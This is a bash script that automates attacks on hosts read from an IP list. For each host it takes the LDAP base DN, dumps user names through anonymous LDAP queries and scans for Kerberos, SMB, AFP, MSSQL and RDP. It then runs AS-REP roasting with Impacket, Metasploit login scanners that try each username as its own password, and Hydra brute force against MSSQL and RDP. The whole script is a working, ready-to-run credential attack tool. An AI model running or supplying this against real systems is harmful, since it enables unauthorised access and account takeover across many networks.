cat iplist | while read line
do


DN=$(timeout 3 python3 getdn.py $line 2> /dev/null | grep "dc=" | head -n 1 | cut -d " " -f 5 )

if [[ ! -z "$DN" ]];then
echo "=============== [Info] ==============="
echo $line
echo $DN

urltmp=${DN//dc=/}
url=${urltmp//,/.}

echo $url

#Dump Users (via uid)
users=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null | grep  "\<uid: " | cut -d " " -f 2)
if [[ ! -z "$users" ]];then
echo "=========== [Users via uid] ==========="
echo "$users"
echo "$users" > users
fi


#Dump Users (via dn: uid)
if [[ -z "$users" ]];then
users=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "=========== [Users via dn] ==========="
echo "$users"
echo "$users" > users

fi

#Full Dump
#timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null 

if [[ ! -z "$users" ]];then
echo "=========== [Scan Services] ==========="
scan_res=$(nmap $line -p 88,389,445,548,1433,3389)

kerb_svc=$(echo "$scan_res" | grep "88/tcp  open")
#ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
mssql_svc=$(echo "$scan_res" | grep "1433/tcp  open")
rdp_svc=$(echo "$scan_res" | grep "3389/tcp  open")

#if [[ ! -z "$ldap_svc" ]];then
#echo "===> LDAP Open : Enum With Hydra Ldap_bruteforce (broken)"
#bash create_user_password_list.sh $line > userpass
#hydra -C userpass $line -m $DN ldap2 
#echo "===> LDAP Closed"
#fi

if [[ ! -z "$kerb_svc" ]];then
echo "===> Kerberos Open : Impacket GetNPUsers "
impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
else 
echo "===> Kerberos Closed"
fi

if [[ ! -z "$smb_svc" ]];then
echo "===> SMB Open : Enum With MSF MODULE SMB_Login (CTRL+C to skip)"
msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapown/users;set USER_AS_PASS 1; set SMBDOMAIN $url; exploit; exit;"
else 
echo "===> SMB Closed"
fi

if [[ ! -z "$afp_svc" ]];then
echo "===> AFP Open : Enum With MSF MODULE AFP_Login"
msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapown/users;set USER_AS_PASS 1; exploit; exit;"
else 
echo "===> AFP Closed"
fi

if [[ ! -z "$mssql_svc" ]];then
echo "===> MSSQL Open : Enum With Hydra MSSQL"
bash create_user_password_list.sh > userpass
hydra -C userpass $line mssql
else 
echo "===> MSSQL Closed"
fi

if [[ ! -z "$rdp_svc" ]];then
echo "===> RDP Open : Enum With Hydra RDP"

bash create_user_password_list.sh > userpass
hydra -t 1 -V -f -C userpass rdp://$line
else 
echo "===> RDP Closed"
fi

else 
echo "============= [Full Dump] ============="
ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null 

fi
echo "======================================="
echo ""
echo ""
fi

done
